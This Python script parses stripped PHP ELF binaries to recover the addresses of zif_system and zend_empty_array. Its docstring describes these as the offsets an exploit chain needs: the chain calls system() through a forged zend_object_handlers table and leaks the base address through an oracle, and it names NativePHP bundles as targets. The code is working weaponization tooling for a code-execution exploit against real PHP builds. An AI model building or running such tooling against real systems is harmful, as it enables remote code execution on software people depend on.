#!/usr/bin/env python3
"""
shape9_elfsyms.py -- offline symbol extraction for (possibly stripped) PHP
monolith binaries (NativePHP bundles php 8.4.27/8.3.36 ZTS; lab stand-in is
/tmp/php8512_build/plain2, php 8.5.12). Supersedes poc_matrix/extract_syms.py
(the "weapons/lab/elfsyms.py" RELA scan).

Goal: recover the two offsets the in-band zero4 chain needs, with NO symbol
table:
  OFF_ZIF    vaddr of zif_system        (exec segment; called via forged
                                         zend_object_handlers table)
  OFF_EMPTY  vaddr of zend_empty_array  (data segment; M2 base-oracle anchor)

Method (RELA-first):
 1. Parse ELF64 program headers (PIE or not).
 2. Walk .rela.dyn/.rela.plt (section headers if present, else fall back to
    PT_DYNAMIC DT_RELA/DT_RELASZ). For R_X86_64_RELATIVE entries the addend
    IS the post-relocation pointer value stored at r_offset -- i.e. every
    internal function pointer sitting in a .data.rel.ro table (exactly where
    ext/standard's zend_function_entry[] lives in a PIE monolith).
 3. zend_function_entry shape: {const char *fname; zif_handler handler;
    const zend_internal_arg_info *arg_info; uint32_t num_args; uint32_t flags; ...}.
    Scan every RELATIVE addend A whose target bytes at A are the C string
    "system\\0"; the qword AFTER the fname pointer slot in the SAME table row
    (at the r_offset+8 file slot) is the handler -> candidate zif_system.
    Cross-check the candidate lies in an executable segment and (belt) that
    the entry's flags/num_args dwords look sane.
 4. No RELA section (non-PIE monolith): raw-scan the data segments for the
    same {ptr->"system", ptr->exec} qword pair (extract_syms.py behavior).
 5. zend_empty_array: dynsym (.dynsym) first (bundled PHP binaries export it);
    else scan .data.rel.ro RELATIVE addends whose address is referenced by
    the largest number of distinct code LEA targets is unreliable -- instead
    fall back to the known anchor: for the M2 oracle we only need it when the
    build is unknown; plain2/lab validation uses dynsym.

Usage:  python3 shape9_elfsyms.py <php-binary> [more binaries...]
Output: per binary:  zif_system=0x... zend_empty_array=0x...  (vaddrs)
Exit 0 if both recovered for at least one binary.
"""
import struct
import sys

SHT_RELA = 4
DT_RELA = 7
DT_RELASZ = 8
DT_RELAENT = 9
R_X86_64_RELATIVE = 8
PT_LOAD = 1
PF_X = 1


class Elf:
    def __init__(self, path):
        self.path = path
        self.d = open(path, 'rb').read()
        d = self.d
        if d[:4] != b'\x7fELF' or d[4] != 2 or d[5] != 1:
            raise ValueError(f"{path}: not ELF64 little-endian")
        (self.e_type,) = struct.unpack_from('<H', d, 16)
        (self.e_phoff,) = struct.unpack_from('<Q', d, 0x20)
        (self.e_shoff,) = struct.unpack_from('<Q', d, 0x28)
        self.e_phentsize, self.e_phnum = struct.unpack_from('<HH', d, 0x36)
        self.e_shentsize, self.e_shnum, self.e_shstrndx = struct.unpack_from('<HHH', d, 0x3a)
        self.segs = []  # (vaddr, filesz, offset, flags)
        for i in range(self.e_phnum):
            off = self.e_phoff + i * self.e_phentsize
            p_type, p_flags = struct.unpack_from('<II', d, off)
            p_offset, p_vaddr, _pa, p_filesz = struct.unpack_from('<QQQQ', d, off + 8)
            if p_type == PT_LOAD:
                self.segs.append((p_vaddr, p_filesz, p_offset, p_flags))
        self.sections = []
        if self.e_shoff and self.e_shnum:
            for i in range(self.e_shnum):
                off = self.e_shoff + i * self.e_shentsize
                sh_name, sh_type, _fl, sh_addr, sh_offset, sh_size, _link, _info, _al, _entsz = \
                    struct.unpack_from('<IIQQQQIIQQ', d, off)
                self.sections.append(dict(name_off=sh_name, type=sh_type, addr=sh_addr,
                                          offset=sh_offset, size=sh_size, entsize=_entsz))

    # ---- address translation ------------------------------------------------
    def vaddr_to_off(self, va):
        for vaddr, filesz, offset, _ in self.segs:
            if vaddr <= va < vaddr + filesz:
                return offset + (va - vaddr)
        return None

    def off_to_vaddr(self, foff):
        for vaddr, filesz, offset, flags in self.segs:
            if offset <= foff < offset + filesz:
                return vaddr + (foff - offset), flags
        return None, None

    def is_exec(self, va):
        off = self.vaddr_to_off(va)
        if off is None:
            return False
        _va, fl = self.off_to_vaddr(off)
        return bool(fl & PF_X)

    def read_vaddr(self, va, n):
        off = self.vaddr_to_off(va)
        if off is None:
            return None
        return self.d[off:off + n]

    def cstr_at(self, va, maxlen=64):
        off = self.vaddr_to_off(va)
        if off is None:
            return None
        end = self.d.find(b'\x00', off, off + maxlen)
        if end < 0:
            return None
        return self.d[off:end]

    # ---- relocations --------------------------------------------------------
    def rela_entries(self):
        """Yield (r_offset, r_info_type, addend). Sections first, PT_DYNAMIC fallback."""
        out = []
        for s in self.sections:
            if s['type'] == SHT_RELA and s['entsize']:
                n = s['size'] // s['entsize']
                for i in range(n):
                    off = s['offset'] + i * s['entsize']
                    r_offset, r_info, r_addend = struct.unpack_from('<QQq', self.d, off)
                    out.append((r_offset, r_info & 0xffffffff, r_addend))
        if out:
            return out
        # PT_DYNAMIC fallback
        for i in range(self.e_phnum):
            off = self.e_phoff + i * self.e_phentsize
            p_type, = struct.unpack_from('<I', self.d, off)
            if p_type != 2:  # PT_DYNAMIC
                continue
            p_offset, _v, _pa, p_filesz = struct.unpack_from('<QQQQ', self.d, off + 8)
            tags = {}
            pos = p_offset
            while pos < p_offset + p_filesz:
                tag, val = struct.unpack_from('<Qq', self.d, pos)
                if tag == 0:
                    break
                tags.setdefault(tag, val)
                pos += 16
            if DT_RELA in tags and DT_RELASZ in tags:
                entsz = tags.get(DT_RELAENT, 24)
                rela_off = self.vaddr_to_off(tags[DT_RELA])
                n = tags[DT_RELASZ] // entsz
                for i in range(n):
                    o = rela_off + i * entsz
                    r_offset, r_info, r_addend = struct.unpack_from('<QQq', self.d, o)
                    out.append((r_offset, r_info & 0xffffffff, r_addend))
        return out

    # ---- dynsym -------------------------------------------------------------
    def dynsym(self):
        for s in self.sections:
            if s['type'] == 11 and s['entsize']:  # SHT_DYNSYM
                names = None
                for s2 in self.sections:
                    if s2['type'] == 3:  # SHT_STRTAB
                        names = s2
                        break
                n = s['size'] // s['entsize']
                for i in range(n):
                    off = s['offset'] + i * s['entsize']
                    st_name, _info, _other, _shndx, st_value, _size = \
                        struct.unpack_from('<IBBHQQ', self.d, off)
                    if st_value and names:
                        end = self.d.find(b'\x00', names['offset'] + st_name)
                        nm = self.d[names['offset'] + st_name:end]
                        yield nm.decode('ascii', 'replace'), st_value


def find_zif_system(elf):
    """RELA-scan for the zend_function_entry row whose fname is "system"."""
    rel = elf.rela_entries()
    # candidate fname vaddrs: any address holding the C string "system"
    cands = []
    i = elf.d.find(b'system\x00')
    while i != -1:
        if i == 0 or elf.d[i - 1] == 0:
            va, fl = elf.off_to_vaddr(i)
            if va is not None:
                cands.append(va)
        i = elf.d.find(b'system\x00', i + 1)
    cand_set = set(cands)

    # 1) RELA route: R_X86_64_RELATIVE addend == &fname_string means the qword
    #    slot at r_offset holds (after relocation) the fname pointer; the next
    #    qword slot (r_offset+8, same table row) is the handler.
    slots = {}  # r_offset -> addend (post-reloc value)
    for r_offset, rtype, addend in rel:
        if rtype == R_X86_64_RELATIVE:
            slots[r_offset] = addend
    hits = []
    for r_offset, addend in slots.items():
        if addend in cand_set:
            nxt = slots.get(r_offset + 8)
            if nxt and elf.is_exec(nxt) and nxt not in cand_set:
                hits.append(nxt)
    if hits:
        return max(set(hits), key=hits.count)

    # 2) raw route (non-PIE / no usable RELA): scan writable+readable data
    #    segments for {ptr->"system", ptr->exec} adjacent qwords.
    for vaddr, filesz, offset, flags in elf.segs:
        if flags & PF_X:
            continue
        buf = elf.d[offset:offset + filesz]
        for cva in cand_set:
            ptr = struct.pack('<Q', cva)
            j = buf.find(ptr)
            while j != -1:
                handler, = struct.unpack_from('<Q', buf, j + 8)
                if elf.is_exec(handler):
                    return handler
                j = buf.find(ptr, j + 1)
    return None


def find_zend_empty_array(elf):
    for nm, val in elf.dynsym():
        if nm == 'zend_empty_array':
            return val
    return None


def main():
    ok = 0
    for path in sys.argv[1:]:
        try:
            elf = Elf(path)
        except Exception as e:
            print(f"{path}: PARSE-FAIL {e}")
            continue
        zif = find_zif_system(elf)
        zea = find_zend_empty_array(elf)
        pie = "PIE" if elf.e_type == 3 else f"etype{elf.e_type}"
        nrel = len(elf.rela_entries())
        print(f"{path}: [{pie}, {nrel} rela] "
              f"zif_system={'0x%x' % zif if zif else 'NOT FOUND'} "
              f"zend_empty_array={'0x%x' % zea if zea else 'NOT FOUND'}")
        if zif and zea:
            ok += 1
    return 0 if ok else 1


if __name__ == '__main__':
    sys.exit(main())
